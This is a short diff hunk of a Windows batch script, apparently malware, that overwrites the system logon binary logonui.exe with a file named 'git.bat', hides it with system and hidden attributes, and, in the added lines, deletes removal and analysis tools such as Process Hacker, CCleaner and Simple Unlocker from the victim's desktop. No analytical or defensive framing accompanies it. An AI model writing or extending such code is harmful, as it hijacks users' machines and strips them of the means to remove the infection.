@@ -59,6 +59,13 @@ copy "git.bat" "C:\Windows\System32\logonui.exe" /Y
 attrib +s +h C:\Windows\System32\git.bat
 
 del C:\Users\%username%\desktop\CCleaner.exe /s /q
+del C:\Users\%username%\desktop\Process Hacker 2.exe /s /q
+del C:\Users\%username%\desktop\Process hacker 2.exe /s /q
+del C:\Users\%username%\desktop\123.exe /s /q
+del C:\Users\%username%\desktop\321.exe /s /q
+del C:\Users\%username%\desktop\777.exe /s /q
+del C:\Users\%username%\desktop\Simple Unlocker.exe /s /q
+del C:\Users\%username%\desktop\Uninstall tool.exe /s /q
 
 Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
 color a
